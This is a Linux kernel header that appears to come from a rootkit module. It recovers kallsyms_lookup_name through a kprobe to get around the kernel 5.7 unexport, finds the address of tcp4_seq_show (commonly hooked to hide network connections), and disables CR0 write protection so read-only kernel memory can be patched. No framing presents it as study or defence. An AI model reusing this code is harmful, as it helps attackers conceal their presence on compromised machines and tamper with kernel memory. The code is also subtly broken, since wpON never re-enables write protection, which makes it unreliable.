
#include <linux/version.h> 

#ifndef HARDWARE_H
#define HARDWARE_H

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#define KPROBE_LOOKUP 1

#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif


typedef unsigned long(*tp_kallsyms_lookup_name)(const char* name);
unsigned long tcp4_seq_show_address(void)
{
#ifdef KPROBE_LOOKUP
    tp_kallsyms_lookup_name kallsyms_lookup_name;
 
    register_kprobe(&kp);
   
    kallsyms_lookup_name = (tp_kallsyms_lookup_name)kp.addr; 
    unregister_kprobe(&kp);   
#endif    
    return kallsyms_lookup_name("tcp4_seq_show");
}


inline void writeCR0(unsigned long cr0) 
{
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void wpOFF(void) 
{
    unsigned long __cr0 = read_cr0(); 
    writeCR0(__cr0 & ~0x00010000); 
}

static inline void wpON(void)
{
    unsigned long __cr0 = read_cr0();
    writeCR0(__cr0); 
}
#endif HARDWARE_H
